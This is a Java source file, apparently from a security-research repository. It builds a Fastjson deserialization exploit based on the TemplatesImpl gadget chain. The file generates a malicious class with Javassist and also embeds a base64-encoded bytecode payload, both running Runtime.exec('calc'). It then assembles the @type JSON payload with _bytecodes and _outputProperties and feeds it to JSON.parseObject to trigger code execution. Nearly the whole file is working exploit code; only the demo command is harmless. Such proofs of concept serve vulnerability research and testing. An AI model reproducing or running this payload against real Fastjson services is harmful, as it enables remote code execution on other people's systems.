/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class TemplatesImpl {
    static String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
    public static class test{}

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "Y5neKO";
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        String TemplatesImplPayload = "yv66vgAAADQASwoADQAqCQArACwIAC0KAC4ALwcAMAgAMQoAMgAzCgAyADQKADUANgcANwoACgA4BwA5BwA6AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC5MY29tL3k1bmVrby9zZWMvZmFzdGpzb24vVGVtcGxhdGVzSW1wbFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEYXJnMAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEABGFyZzEBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAEYXJnMgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADcBAApTb3VyY2VGaWxlAQAZVGVtcGxhdGVzSW1wbFBheWxvYWQuamF2YQwADgAPBwA8DAA9AD4BAAdTdWNjZXNzBwA/DABAAEEBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcAQgwAQwBEDABFAEYHAEcMAEgASQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEoADwEALGNvbS95NW5la28vc2VjL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANlcnIBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAAd3YWl0Rm9yAQADKClJAQAPcHJpbnRTdGFja1RyYWNlACEADAANAAAAAAAEAAEADgAPAAEAEAAAAC8AAQABAAAABSq3AAGxAAAAAgARAAAABgABAAAAEQASAAAADAABAAAABQATABQAAAABABUAFgACABAAAAA/AAAAAwAAAAGxAAAAAgARAAAABgABAAAAHwASAAAAIAADAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACABAAAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAAJAASAAAAKgAEAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAHgACAAAAAQAfACAAAwAbAAAABAABABwACAAhAA8AAQAQAAAAhwAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAMAEQAAAB4ABwAAABMACAAVABIAFgAdABkAIAAXACEAGAAlABoAEgAAABYAAgASAAsAIgAjAAAAIQAEACQAJQAAACYAAAAHAAJgBwAnBAABACgAAAACACk=";

        byte[] evilCode = cc.toBytecode();
        String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
        System.out.println(evilCode_base64);
        String payload =
                "{\"" +
                        "@type\":\"" + NASTY_CLASS + "\"," + "\"" +
                        "_bytecodes\":[\"" + TemplatesImplPayload + "\"]," +
                        "'_name':'asd','" +
                        "_tfactory':{ },\"" +
                        "_outputProperties\":{ }," + "\"" +
                        "_version\":\"1.0\",\"" +
                        "allowedProtocols\":\"all\"}\n";
        System.out.println(payload);
        Object obj = JSON.parseObject(payload, Feature.SupportNonPublicField);
    }

}